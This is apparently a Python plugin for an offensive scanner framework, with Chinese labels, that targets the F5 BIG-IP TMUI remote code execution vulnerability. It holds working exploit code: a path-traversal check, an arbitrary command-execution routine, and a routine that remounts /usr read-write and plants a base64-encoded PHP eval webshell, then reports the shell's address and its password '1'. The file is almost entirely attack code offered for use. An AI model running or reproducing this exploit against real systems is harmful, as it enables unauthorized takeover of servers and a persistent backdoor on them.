# -*-* coding:UTF-8
import json
import base64
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "F5 BIG-IP 远程代码执行漏洞",
        "description": "F5官方公布流量管理用户界面（TMUI）存在前台远程执行代码漏洞。攻击者利用该漏洞，构造恶意请求，在未授权的情况下获得目标服务器的权限，实现远程代码执行。",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user',
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=15
        )
        if r.status_code == 200:
            resp = r.json()
            if resp.get('error') == '' and resp.get('output') != '':
                return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        random_str = self.build_random_str()
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(
                url,
                f"./tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/{random_str}&content={cmd}"
            ),
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=30
        )
        if r.status_code != 200:
            return
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(
                url,
                f"./tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/{random_str}"
            ),
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=30
        )
        if r.status_code == 200:
            res = json.loads(r.text)['commandResult']
            return res

    @cli.command(description='写入一句话马')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    def write_shell(self, url):
        payload = f'mount -o remount -rw /usr;' \
                  f'echo \'<?php eval($_POST[1]);\'>/usr/local/www/xui/common/config.php;' \
                  f'mount -o remount -r /usr'
        base64_str = base64.b64encode(payload.encode()).decode()
        cmd = f"echo {base64_str}|base64 -d|sh"
        self.exec_cmd(url, cmd)
        random_str = self.build_random_str()
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(url, f"./xui/common/config.php?1=system('echo {random_str}');"),
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=15
        )
        if r.status_code == 200 and random_str in r.text:
            self.log.success('一句话马写入成功')
            self.log.success(f'访问地址: {urllib.parse.urljoin(url, "./xui/common/config.php")}')
            self.log.success('访问密码: 1')
        else:
            self.log.failure('一句话马写入失败')
